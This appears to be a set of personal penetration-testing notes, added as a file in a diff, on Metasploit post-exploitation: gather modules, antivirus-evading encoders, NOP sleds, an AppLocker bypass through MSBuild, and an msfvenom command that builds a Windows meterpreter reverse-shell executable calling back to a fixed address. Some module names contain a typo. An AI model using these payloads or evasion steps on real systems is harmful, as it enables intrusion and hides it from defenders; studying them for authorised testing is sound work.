@@ -1,0 +1,95 @@
+#+title: Post Exploitation
+#+date:    2025-09-26
+#+contact: gabriel
+
+Post exploitation modules are used after a machine has been compromised and a meterpreter session has been opened. They perform various tasks such as collecting data from the machine and elevating privileges.
+
+After penetrating a system, you may want to gain further access to the target's internal networks by pivoting and cleaning up your tracks as you move between systems.
+
+A penetration tester might want to sniff packets for other potential targets, modify registry entries to gain more information or access, or place a backdoor to ensure persistent system access.
+
+* Information Gathering
+To search for post exploitation modules related to information gathering, we can search with
+: search type:post gather
+
+*select an payload* ->
+: use post/linux/gather/enum_system
+
+*set the session value* ->
+: set SESSION 1
+
+: run
+
+* Encoders
+Encoders take the raw data of a payload and rearrange it using a specific encoding algorithm.
+
+Bad characters can cause the payload to not work as expected on the target system. Encoders mask these characters to ensure the payload runs smoothly.
+
+Antivirus software and other security products look for known malware signatures. Encoders make it harder for these security measures to detect the payload, increasing the chance of a successful attack.
+
+Different encoders can be customized for various situations and target systems.
+
+: show encoders
+
+*example* ->
+
+: use payload/windows/meterpreteer/reverse_tcp
+
+: set ENCODER x86/shikata_ga_nai
+
+: generate -f exe -o /root/Desktop/payload.exe
+
+* Nops (No Operations)
+As the name suggests, these commands do not perform any operation. Nops typically instruct a processor to move on to the next command without performing any action.
+
+Nops modules are used to implement techniques known as "NOP sled" or "NOP slide" during exploits. This technique plays a crucial role in ensuring that an exploit successfully executes.
+
+The primary purpose of using Nops is to provide a reliable "slide" to a specific location in the target system's memory. An exploit aims to execute a piece of code in the target system's memory.
+
+A Nops sled consists of a series of "nop" commands placed before the malicious code. Even if the attacker does not know the exact starting point of the exploit, it can "slide" into the exploit code from any memory address.
+
+: show nops
+
+When creating an exploit or preparing a payload, you can select one of these Nops modules to make the exploit/payload more flexible and reliable.
+
+*example* ->
+
+: use payload/windows/meterpreteer/reverse_tcp
+
+: set NOP x86/single_byte
+
+: generate -f exe -o /root/Desktop/payload.exe
+
+* Evasion
+Evasion modules are used during the preparation and execution of exploits. An attacker uses these modules to bypass security measures and access target systems with as little attention as possible.
+
+Evasion modules implement strategies to ensure that exploits and payloads are executed successfully without being detected by security measures
+
+: show evasion
+
+For example, to bypass policy-based application control systems like AppLocker or antivirus software in Windows environments, the following steps can be taken.
+
+: use evasion/windows/applocker_evasion_msbuild
+
+: set PAYLOAD windows/x64/meterpreter_reverse_tcp
+
+This evasion module creates and sends a payload that bypasses AppLocker policies through MSBuild, allowing the malicious code to be executed.
+
+If AppLocker policies are active on the target system and MSBuild is listed as a trusted application, this technique has a high chance of success.
+
+
+* msfvenom
+MSFvenom is the combination of the Msfpayload and Msfencode tools into a single Metasploit Framework utility. As of June 8, 2015, MSFvenom replaced MSFpayload and MSFencode.
+
+- A single tool
+- Standardized command line options
+- Increased speed
+
+  With MSFvenom, we can generate payloads for various platforms. For instance, we can create an exe file to deploy a backdoor for Windows operating systems, an elf file for Linux operating systems, or apk files for Android operating systems, etc.
+
+  MSFvenom allows for the rapid creation of malware and the encoding of payloads to evade existing security solutions.
+
+  *example* ->
+  : msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.20.5.187 LPORT=1337 -f exe -o meterpreter_shell.exe
+
+  This command generates an .exe file containing a meterpreter payload that establishes a reverse shell connection for the Windows operating system.
